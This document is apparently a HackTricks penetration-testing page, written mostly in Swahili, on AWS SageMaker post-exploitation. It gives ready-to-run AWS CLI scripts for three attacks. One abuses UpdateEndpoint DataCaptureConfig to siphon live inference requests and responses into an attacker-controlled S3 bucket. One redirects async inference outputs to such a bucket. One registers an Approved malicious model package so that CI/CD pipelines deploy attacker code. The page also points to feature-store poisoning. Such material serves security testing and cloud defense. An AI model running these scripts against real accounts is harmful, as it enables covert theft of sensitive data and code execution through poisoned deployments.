# AWS - SageMaker Post-Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker endpoint data siphon via UpdateEndpoint DataCaptureConfig

Tumia vibaya usimamizi wa endpoint wa SageMaker ili kuwezesha kunasa kikamilifu request/response kwenye bucket ya S3 inayodhibitiwa na mshambuliaji bila kugusa model au container. Inatumia rolling update yenye zero/low‑downtime na inahitaji tu ruhusa za usimamizi wa endpoint.

### Mahitaji
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: `s3:CreateBucket` (au tumia bucket iliyopo katika akaunti ileile)
- Hiari (ikiwa unatumia SSE‑KMS): `kms:Encrypt` kwenye CMK iliyochaguliwa
- Lengo: Endpoint ya InService ya real‑time iliyopo katika akaunti/eneo ileile

### Hatua
1) Tambua endpoint ya InService na ukusanye production variants za sasa
```bash
REGION=${REGION:-us-east-1}
EP=$(aws sagemaker list-endpoints --region $REGION --query "Endpoints[?EndpointStatus=='InService']|[0].EndpointName" --output text)
echo "Endpoint=$EP"
CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
echo "EndpointConfig=$CFG"
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CFG" --query ProductionVariants > /tmp/pv.json
```
2) Andaa mahali pa S3 la mshambuliaji kwa ajili ya kunasa
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-capture-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
```
3) Unda EndpointConfig mpya inayohifadhi variants zile zile lakini inawasha DataCapture kwa attacker bucket

Note: Tumia explicit content types ambazo zinakidhi uthibitisho wa CLI.
```bash
NEWCFG=${CFG}-dc
cat > /tmp/dc.json << JSON
{
"EnableCapture": true,
"InitialSamplingPercentage": 100,
"DestinationS3Uri": "s3://$BUCKET/capture",
"CaptureOptions": [
{"CaptureMode": "Input"},
{"CaptureMode": "Output"}
],
"CaptureContentTypeHeader": {
"JsonContentTypes": ["application/json"],
"CsvContentTypes": ["text/csv"]
}
}
JSON
aws sagemaker create-endpoint-config \
--region $REGION \
--endpoint-config-name "$NEWCFG" \
--production-variants file:///tmp/pv.json \
--data-capture-config file:///tmp/dc.json
```
4) Tekeleza config mpya kwa rolling update (minimal/no downtime)
```bash
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
5) Tengeneza angalau inference call moja (hiari ikiwa kuna live traffic)
```bash
echo '{"inputs":[1,2,3]}' > /tmp/payload.json
aws sagemaker-runtime invoke-endpoint --region $REGION --endpoint-name "$EP" \
--content-type application/json --accept application/json \
--body fileb:///tmp/payload.json /tmp/out.bin || true
```
6) Thibitisha captures katika attacker S3
```bash
aws s3 ls s3://$BUCKET/capture/ --recursive --human-readable --summarize
```
### Athari
- Kuondolewa kabisa kwa payloads za maombi na majibu za inference kwa wakati halisi (na metadata) kutoka kwa endpoint lengwa hadi S3 bucket inayodhibitiwa na mshambuliaji.
- Hakuna mabadiliko kwenye model/container image na mabadiliko ni ya ngazi ya endpoint tu, ikiruhusu njia fiche ya wizi wa data yenye usumbufu mdogo wa operesheni.


## SageMaker kuiba matokeo ya async inference kupitia UpdateEndpoint AsyncInferenceConfig

Tumia vibaya usimamizi wa endpoint kurejesha matokeo ya asynchronous inference kwenye S3 bucket inayodhibitiwa na mshambuliaji kwa kukopa EndpointConfig ya sasa na kuweka AsyncInferenceConfig.OutputConfig S3OutputPath/S3FailurePath. Hii inatoa nje utabiri wa model (na yoyote transformed inputs zilizojumuishwa na container) bila kubadilisha model/container.

### Mahitaji
- IAM: `sagemaker:DescribeEndpoint`, `sagemaker:DescribeEndpointConfig`, `sagemaker:CreateEndpointConfig`, `sagemaker:UpdateEndpoint`
- S3: Uwezo wa kuandika kwenye S3 bucket inayodhibitiwa na mshambuliaji (kupitia model execution role au permissive bucket policy)
- Lengo: Endpoint ya InService ambapo asynchronous invocations zina (au zitatumika)

### Hatua
1) Kusanya ProductionVariants za sasa kutoka kwa endpoint lengwa
```bash
REGION=${REGION:-us-east-1}
EP=<target-endpoint-name>
CUR_CFG=$(aws sagemaker describe-endpoint --region $REGION --endpoint-name "$EP" --query EndpointConfigName --output text)
aws sagemaker describe-endpoint-config --region $REGION --endpoint-config-name "$CUR_CFG" --query ProductionVariants > /tmp/pv.json
```
2) Unda attacker bucket (hakikisha model execution role inaweza PutObject kwenye hiyo)
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-async-exfil-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION || true
```
3) Kloni EndpointConfig na hijack outputs za AsyncInference hadi kwenye attacker bucket
```bash
NEWCFG=${CUR_CFG}-async-exfil
cat > /tmp/async_cfg.json << JSON
{"OutputConfig": {"S3OutputPath": "s3://$BUCKET/async-out/", "S3FailurePath": "s3://$BUCKET/async-fail/"}}
JSON
aws sagemaker create-endpoint-config --region $REGION   --endpoint-config-name "$NEWCFG"   --production-variants file:///tmp/pv.json   --async-inference-config file:///tmp/async_cfg.json
aws sagemaker update-endpoint --region $REGION --endpoint-name "$EP" --endpoint-config-name "$NEWCFG"
aws sagemaker wait endpoint-in-service --region $REGION --endpoint-name "$EP"
```
4) Amsha async invocation na thibitisha vitu vinafika kwenye S3 ya mshambuliaji
```bash
aws s3 cp /etc/hosts s3://$BUCKET/inp.bin
aws sagemaker-runtime invoke-endpoint-async --region $REGION --endpoint-name "$EP" --input-location s3://$BUCKET/inp.bin >/tmp/async.json || true
sleep 30
aws s3 ls s3://$BUCKET/async-out/ --recursive || true
aws s3 ls s3://$BUCKET/async-fail/ --recursive || true
```
### Impact
- Huelekeza matokeo ya inferensi zisizo za papo hapo (na miili ya makosa) kwenda S3 inayodhibitiwa na mshambuliaji, ikiruhusu uondoaji wa siri wa utabiri na kwa uwezekano wa kuchapua au kuchakata ingizo zenye taarifa nyeti kabla/baada ya usindikaji zinazozalishwa na kontena, bila kubadilisha msimbo wa model au picha ya kontena na kwa downtime ndogo au bila downtime.

## SageMaker Model Registry supply-chain injection via CreateModelPackage(Approved)

Ikiwa mshambuliaji anaweza CreateModelPackage kwenye SageMaker Model Package Group lengwa, anaweza kusajili toleo jipya la model linaloelekeza kwenye container image inayodhibitiwa na mshambuliaji na mara moja kuifanya Approved. Mifumo mingi ya CI/CD hupeleka moja kwa moja toleo za model zilizokuwa Approved kwenda endpoints au training jobs, na kusababisha utekelezaji wa msimbo wa mshambuliaji chini ya execution roles za huduma. Mwonekano wa cross-account unaweza kuongezwa kwa sera ya rasilimali ya ModelPackageGroup inayoruhusu.

### Requirements
- IAM (kima cha chini ili kuingiza sumu kwenye kikundi kilicho tayari): `sagemaker:CreateModelPackage` on the target ModelPackageGroup
- Hiari (kwa kuunda group ikiwa hakipo): `sagemaker:CreateModelPackageGroup`
- S3: Upatikanaji wa kusoma kwa referenced ModelDataUrl (au kuwa mwenyeji wa artifacts zinazodhibitiwa na mshambuliaji)
- Target: Model Package Group ambayo automation ya downstream inaangalia kwa toleo zilizotengwa/Approved

### Steps
1) Weka region na unda/pata Model Package Group lengwa
```bash
REGION=${REGION:-us-east-1}
MPG=victim-group-$(date +%s)
aws sagemaker create-model-package-group --region $REGION --model-package-group-name $MPG --model-package-group-description "test group"
```
2) Andaa data bandia ya modeli kwenye S3
```bash
ACC=$(aws sts get-caller-identity --query Account --output text)
BUCKET=ht-sm-mpkg-$ACC-$(date +%s)
aws s3 mb s3://$BUCKET --region $REGION
head -c 1024 </dev/urandom > /tmp/model.tar.gz
aws s3 cp /tmp/model.tar.gz s3://$BUCKET/model/model.tar.gz --region $REGION
```
3) Sajili toleo la kifurushi cha modeli lenye nia mbaya (hapa halina madhara) la Approved linalorejelea image ya umma ya AWS DLC
```bash
IMG="683313688378.dkr.ecr.$REGION.amazonaws.com/sagemaker-scikit-learn:1.2-1-cpu-py3"
cat > /tmp/inf.json << JSON
{
"Containers": [
{
"Image": "$IMG",
"ModelDataUrl": "s3://$BUCKET/model/model.tar.gz"
}
],
"SupportedContentTypes": ["text/csv"],
"SupportedResponseMIMETypes": ["text/csv"]
}
JSON
aws sagemaker create-model-package --region $REGION   --model-package-group-name $MPG   --model-approval-status Approved   --inference-specification file:///tmp/inf.json
```
4) Thibitisha kuwa toleo jipya lililokubaliwa lipo
```bash
aws sagemaker list-model-packages --region $REGION --model-package-group-name $MPG --output table
```
### Athari
- Poison the Model Registry kwa toleo la Approved linalorejelea attacker-controlled code. Pipelines ambazo hu-auto-deploy Approved models zinaweza kuvuta na kuendesha attacker image, zikisababisha utekelezaji wa code chini ya endpoint/training roles.
- Kwa ModelPackageGroup resource policy yenye ruhusa pana (PutModelPackageGroupPolicy), matumizi mabaya haya yanaweza kuchochewa cross-account.

## Feature store poisoning

Abuse `sagemaker:PutRecord` kwenye Feature Group yenye OnlineStore imewezeshwa ili kuandika upya live feature values zinazotumiwa na online inference. Ikiwa ikichanganywa na `sagemaker:GetRecord`, attacker anaweza kusoma sensitive features. Hii haitaji access kwa models au endpoints.

{{#ref}}
feature-store-poisoning.md
{{/ref}}
